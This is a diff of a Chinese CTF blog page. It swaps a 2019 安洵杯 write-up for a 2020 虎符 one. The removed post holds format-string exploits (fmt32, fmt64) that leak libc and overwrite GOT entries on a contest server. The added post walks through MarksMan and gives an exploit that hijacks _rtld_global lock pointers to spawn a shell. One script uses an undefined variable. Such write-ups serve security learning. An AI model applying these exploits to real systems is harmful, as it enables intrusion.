@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>安洵杯2019 | 风云阁</title>
-  <meta name="keywords" content=" Pwn , CTF ">
-  <meta name="description" content="安洵杯2019 | 风云阁">
+  <title>数字中国虎符网安大赛2020 | 风云阁</title>
+  <meta name="keywords" content="">
+  <meta name="description" content="数字中国虎符网安大赛2020 | 风云阁">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="红宝石🍬 📒 数字运算符优先级  📒 取余只返回正数  puts (5 % 3)     # prints  2   puts (-5 % 3)    # prints  1   puts (5 % -3)    # prints -1   puts (-5 % -3)   # prints -2   🍬 逻辑或返回值取决于第一个操作数，返回第一个操作数如果其为非假，否则返回第二个操作数。">
 <meta property="og:type" content="article">
@@ -375,33 +375,19 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-安洵杯2019" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-数字中国虎符网安大赛2020" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">安洵杯2019</h1>
+        <h1 class="article-title">数字中国虎符网安大赛2020</h1>
     
     <div class="article-meta">
         
         
         
-        <span class="book">
-            
-                <a  data-rel="CTF">CTF</a>
-            
-        </span>
-        
-        
-        <span class="tag">
-            
-            <a class="color4">Pwn</a>
-            
-            <a class="color4">CTF</a>
-            
-        </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title='更新时间: 2020-04-11 01:24:25'>2019-11-30 00:00</time>
+        创建时间:<time class="date" title='更新时间: 2020-04-23 13:38:41'>2020-04-23 12:50</time>
         
     </div>
     <div class="article-meta">
@@ -423,7 +409,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#安洵杯2019"><span class="toc-text">安洵杯2019</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#fmt32"><span class="toc-text">fmt32</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fmt64"><span class="toc-text">fmt64</span></a></li></ol></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#tags-CTF-Pwn"><span class="toc-text">tags:[CTF,Pwn]</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#虎符网安大赛2020"><span class="toc-text">虎符网安大赛2020</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#MarksMan"><span class="toc-text">MarksMan</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -439,199 +425,84 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="安洵杯2019"><a href="#安洵杯2019" class="headerlink" title="安洵杯2019"></a>安洵杯2019</h1><h3 id="fmt32"><a href="#fmt32" class="headerlink" title="fmt32"></a>fmt32</h3><p>fmt leak binary, leak libc got, modify read’s got</p>
-<pre><code>from pwn import * 
-import plus_fmt as pft
-start_addr=0x8048000
-end_addr=0x804a000
-p=remote(&#39;47.108.135.45&#39;,10001)
+        <hr>
+<h2 id="tags-CTF-Pwn"><a href="#tags-CTF-Pwn" class="headerlink" title="tags:[CTF,Pwn]"></a>tags:[CTF,Pwn]</h2><h1 id="虎符网安大赛2020"><a href="#虎符网安大赛2020" class="headerlink" title="虎符网安大赛2020"></a>虎符网安大赛2020</h1><h2 id="MarksMan"><a href="#MarksMan" class="headerlink" title="MarksMan"></a>MarksMan</h2><p>程序逻辑清晰，puts地址白给。提供一个地址连续三个字节写。 </p>
+<p><img src="/2020/04/23/%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E8%99%8E%E7%AC%A6%E7%BD%91%E5%AE%89%E5%A4%A7%E8%B5%9B2020/image-20200423125355070.png" alt></p>
+<p>此处无故开启dlopen，猜测出题人为了利用里面的关键函数而强行给出的。gdb跟进去调试。</p>
+<p><img src="/2020/04/23/%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E8%99%8E%E7%AC%A6%E7%BD%91%E5%AE%89%E5%A4%A7%E8%B5%9B2020/image-20200423130954219.png" alt></p>
+<p>根据函数名称可知，调用了加锁函数。那么想必后面肯定有解锁。 </p>
+<p><img src="/2020/04/23/%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E8%99%8E%E7%AC%A6%E7%BD%91%E5%AE%89%E5%A4%A7%E8%B5%9B2020/image-20200423130939254.png" alt></p>
+<p>这里调用了指针函数，指针位于数据段，可写。</p>
+<p>再往下调试，果然，遇见了解锁函数。</p>
+<p><img src="/2020/04/23/%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E8%99%8E%E7%AC%A6%E7%BD%91%E5%AE%89%E5%A4%A7%E8%B5%9B2020/image-20200423131516723.png" alt></p>
+<p><img src="/2020/04/23/%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E8%99%8E%E7%AC%A6%E7%BD%91%E5%AE%89%E5%A4%A7%E8%B5%9B2020/image-20200423131228470.png" alt></p>
+<p>发现此时rdi指向的 <code>_rtld_global+2312</code> ，此处可写。计算得到 lock 函数与此处距离1528个字节。</p>
+<p>看一下其他地方有无调用这个加锁解锁函数。</p>
+<p>给这两个地方下断。</p>
+<p><img src="/2020/04/23/%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E8%99%8E%E7%AC%A6%E7%BD%91%E5%AE%89%E5%A4%A7%E8%B5%9B2020/image-20200423131958875.png" alt></p>
+<p><img src="/2020/04/23/%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E8%99%8E%E7%AC%A6%E7%BD%91%E5%AE%89%E5%A4%A7%E8%B5%9B2020/image-20200423131916976.png" alt></p>
+<p>程序退出调用exit后，会执行到加锁函数。那么攻击思路就浮出水面了。</p>
+<p><img src="/2020/04/23/%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E8%99%8E%E7%AC%A6%E7%BD%91%E5%AE%89%E5%A4%A7%E8%B5%9B2020/image-20200423132208719.png" alt></p>
+<ul>
+<li><input disabled type="checkbox"> </li>
+<li><input checked disabled type="checkbox"> <p>篡改函数指针 <code>_rtld_global._dl_rtld_unlock_recursive</code> 为 <code>gets</code></p>
+</li>
+<li><input checked disabled type="checkbox"> <p>向rdi写入 <code>/bin/sh\x00</code> + padding + system。 这样可覆盖 <code>_rtld_global._dl_rtld_lock_recursive</code> 。</p>
+</li>
+</ul>
+<p><strong>exp</strong></p>
+<pre><code class="python">from pwn import * 
+import primedbg 
+import sys 
+context.arch=&#39;amd64&#39;
+z=process(&#39;./chall&#39;)
+libc=ELF(&#39;./libc.so.6&#39;,False)
+z.recvuntil(&#39; near: &#39;)
+
+if len(sys.argv)&gt;1:
+
+    sub_script=[
+        &#39;directory glibc-2.27/stdlib/&#39;,
+        # &#39;directory glibc-2.27/elf&#39;,
+        #&#39;b *_dl_open+60&#39;
+        &#39;b *_dl_open+236 \n&#39;,
+        #b *rtld_lock_default_lock_recursive\n,
+    ]
+
+    script=&#39;\n&#39;.join(sub_script)+&#39;\n&#39;
+    primedbg.attach_dbg_pie(z,[0xd63],[],script)
+    #call rdx 274495 
+    # 0x7f1a42b4ca09 &lt;_dl_fini+105&gt;    call   qword ptr [rip + 0x218551] #6314505
+
+puts_adr=int(z.recv(14),16)
+lib_base=puts_adr-0x809c0  
+func_ptr=lib_base+  8511336 #_rtld_global._dl_rtld_unlock_recursive
+gets_adr=lib_base+0x800b0
+sys_adr=lib_base+0x4f440
+
+one=gets_adr
+o1=one&amp;0xff 
+o2=(one&amp;0xff00)&gt;&gt;8
+o3=(one&amp;0xff0000)&gt;&gt;16
+success(&#39;one_gadgets: %x\n(%x,%x,%x)&#39;%(one,o1,o2,o3))
+success(&#39;libc: %#x\ngets: %#x&#39;%(lib_base,gets_adr))
+
+z.sendlineafter(&#39;t!shoot!&#39;,str(target))
+z.sendlineafter(&#39;iang!\n&#39;,chr(o1))
+z.sendlineafter(&#39;iang!\n&#39;,chr(o2))
+z.sendlineafter(&#39;iang!\n&#39;,chr((o3)))
 
 
-def leak(addr):
-    p.recvuntil(&#39;Please tell me:&#39;)
-    payload=&#39;%10$s&#39;+&#39;OOOO&#39;+p32(addr)
-    p.sendline(payload)
-    p.recvuntil(&#39;Repeater:&#39;)
-    data=p.recvuntil(&#39;OOOO&#39;,True)
-    data+=&#39;\x00&#39;
-    return data
+payload= &#39;/bin/sh\x00&#39;+p64(0x0)*190+p64(sys_adr) # write _rtld_global._dl_rtld_lock_recursive
+sleep(0.1)
+z.sendline(payload)
 
-def binary_get():
-
-    f=open(&#39;pwnelf&#39;,&#39;w&#39;)
-    f2=open(&#39;pwnelf2&#39;,&#39;w&#39;)
-
-    cur_addr = start_addr
-    while cur_addr&lt;=end_addr:
-        data = leak(cur_addr)
-        log.success(&#39;{} =&gt;{}&#39;.format(hex(cur_addr), repr(data)))
-        cur_addr += len(data)
-        if f2.closed==False:
-            f2.write(data)
-        if cur_addr&gt;start_addr+0x500:
-            f2.close()
-        f.write(data)
-    f.close()
-
-puts_got=0x804A01C
-read_got=0x804A010
-printf_got=0x804A014
-stderr_got=0x804A040
-payload=&#39;%10$s&#39;+&#39;OOOO&#39;+p32(puts_got)
-p.sendline(payload)
-p.recvuntil(&#39;Repeater:&#39;)
-puts_so=u32(p.recvn(4))
-print(hex(puts_so))
-libc_base=puts_so-0x5f140
-one=libc_base+0x3a80c
-print(hex(libc_base))
-system=0x03a940+libc_base
-
-payload=&#39;%10$s&#39;+&#39;OOOO&#39;+p32(stderr_got)
-p.sendline(payload)
-p.recvuntil(&#39;Repeater:&#39;)
-stderr_so=u32(p.recvn(4))
-print(hex(stderr_so),hex(one))
-
-log.success(&#39;one:%#x,stderr:%#x&#39;%(one,stderr_so))
+z.interactive()
 
 
-tag = {read_got:one} #printf-&gt;one
+# 0x7fbabaf51f60 _rtld_global+3840 _rtld_global._dl_rtld_lock_recursive
+# 0x7fbabaf51f68 &lt;_rtld_global+3848&gt; _rtld_global._dl_rtld_unlock_recursive</code></pre>
 
-# payload = pft. new_fmtstr_payload(8, tag, bits=32, write_size=&#39;short&#39;)
-# #payload=&#39;%34819c%17$hn%28622c%18$hnaa\x10\xa0\x04\x08\x12\xa0\x04\x08&#39;
-# #one:0xf7de480c
-# p.sendline(payload)
-
-low=one&amp;0xffff
-low-=9
-high=one&gt;&gt;16
-log.success(&#39;high:%#x,low:%#x&#39;%(high,low))
-str_low=str(low)
-str_high=str(high)
-offset=15
-payload=&#39;&#39;
-payload += &#39;%&#39;+str_low+&#39;c%&#39;+str(offset)+&#39;$hn&#39;
-payload += &#39;%&#39;+str(high-low-9)+&#39;c%&#39;+str(offset+1)+&#39;$hn&#39;
-
-align=((4-len(payload)%4)+1)
-payload+=&#39;a&#39;*align
-print(len(payload))
-
-payload += p32(read_got)+p32(read_got+2)
-
-p.sendline(payload)
-# print(repr(payload))
-# p.recvuntil(&#39;Repeater:&#39;)
-
-
-# payload=&#39;%10$s&#39;+&#39;OOOO&#39;+p32(stderr_got)
-# p.sendline(payload)
-# p.recvuntil(&#39;Repeater:&#39;)
-# stderr_so=u32(p.recvn(4))
-# print(hex(stderr_so),hex(one))
-
-
-
-p.interactive()
-</code></pre><h3 id="fmt64"><a href="#fmt64" class="headerlink" title="fmt64"></a>fmt64</h3><p>leak速度很慢，利用给的 readelf -s fmt64 ,计算ELF的read GOT，改got,pwntools fmt 打不了。手写一个fmt。</p>
-<pre><code>from pwn import * 
-import plus_fmt as pft
-p=remote(&#39;47.108.135.45&#39;,20176)
-
-
-# payload=&#39;%9$ppppp&#39;+&#39;a&#39;*0x8
-# p.sendline(payload)
-# p.interactive()
-
-start_addr=0x400000
-end_addr=start_addr+0xf00
-f=open(&#39;elf&#39;,&#39;w&#39;)
-
-def leak(addr):
-    p.recvuntil(&#39;Please tell me:&#39;)
-    payload=&#39;%9$s&#39;+&#39;OOOO&#39;+p64(addr)
-    p.sendline(payload)
-    p.recvuntil(&#39;Repeater:&#39;)
-    data=p.recvuntil(&#39;OOOO&#39;,True)
-    data+=&#39;\x00&#39;
-    return data
-
-
-def binary_get():
-    cur_addr = start_addr
-    while cur_addr&lt;=end_addr:
-        data = leak(cur_addr)
-        log.success(&#39;{} =&gt;{}&#39;.format(hex(cur_addr), repr(data)))
-        cur_addr += len(data)
-        f.write(data)
-    f.close()
-
-#binary_get()
-
-got_base=0x601018
-puts_got=got_base
-read_got=got_base+6*8
-stderr_got=0x6010a0
-strlen_got=got_base+8
-
-
-p.recvuntil(&#39;Please tell me:&#39;)
-payload=&#39;%9$s&#39;+&#39;OOOO&#39;+p64(puts_got)
-p.sendline(payload)
-p.recvuntil(&#39;Repeater:&#39;)
-puts_so=u64(p.recvn(6).ljust(8,&#39;\x00&#39;))
-libc_base=puts_so-0x06f690
-one=0xf1147+libc_base
-system=libc_base+0x45390
-log.success(&#39;libc_base ==&gt; %#x,one ==&gt; %#x&#39;%(libc_base,one))
-
-tag=[read_got,one]
-
-prew=9
-by=[]
-one2=one
-offset=17
-
-#tag={stderr_got:one}
-#payload = pft. new_fmtstr_payload(8, tag, numbwritten=0,bits=64, write_size=&#39;short&#39;)
-
-for i in range(6):
-    by.append(one2&amp;0xff)
-    one2&gt;&gt;=8
-print(by)
-
-payload = &#39;&#39;
-
-for i in range(6):
-    payload += &#39;%&#39;
-    cnt=(0x100+by[i]-(prew%0x100))%0x100
-    payload +=str(cnt)
-    payload+=&#39;c%&#39;+str(offset+i)+&#39;$hhn&#39;
-    prew+=cnt
-
-payload += &#39;a&#39;*(8-len(payload)%8)
-log.success(&#39;payload ==&gt; %s,%d&#39;%(repr(payload),len(payload)))
-if(len(payload)==64):
-    print(&#39;abort&#39;)
-    exit(0)
-
-for i in range(6):
-    payload+=p64(tag[0]+i)
-log.success(&#39;payload ==&gt; %s,%d&#39;%(repr(payload),len(payload)))
-
-p.send(payload)
-
-
-# p.recvuntil(&#39;Repeater:&#39;)
-
-# payload=&#39;%9$s&#39;+&#39;OOOO&#39;+p64(read_got)
-# p.sendline(payload)
-# p.recvuntil(&#39;Repeater:&#39;)
-# stderr_so=u64(p.recvn(6).ljust(8,&#39;\x00&#39;))
-# log.success(&#39;stderrgot ==&gt; %#x&#39;,stderr_so)
-
-p.interactive()</code></pre>
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论。 </span>
     </div>
@@ -640,12 +511,12 @@ p.interactive()</code></pre>
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>安洵杯2019</p>
+    <p><span class="copy-title">文章标题:</span>数字中国虎符网安大赛2020</p>
     
     <p><span class="copy-title">本文作者:</span><a  title="枫云李">枫云李</a></p>
-    <p><span class="copy-title">发布时间:</span>2019-11-30, 00:00:00</p>
-    <p><span class="copy-title">最后更新:</span>2020-04-11, 01:24:25</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/2019/11/30/%E5%AE%89%E6%B4%B5%E6%9D%AF2019/" title="安洵杯2019">https://primelyw.github.io/2019/11/30/%E5%AE%89%E6%B4%B5%E6%9D%AF2019/</a>
+    <p><span class="copy-title">发布时间:</span>2020-04-23, 12:50:42</p>
+    <p><span class="copy-title">最后更新:</span>2020-04-23, 13:38:41</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/2020/04/23/%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E8%99%8E%E7%AC%A6%E7%BD%91%E5%AE%89%E5%A4%A7%E8%B5%9B2020/" title="数字中国虎符网安大赛2020">https://primelyw.github.io/2020/04/23/%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E8%99%8E%E7%AC%A6%E7%BD%91%E5%AE%89%E5%A4%A7%E8%B5%9B2020/</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
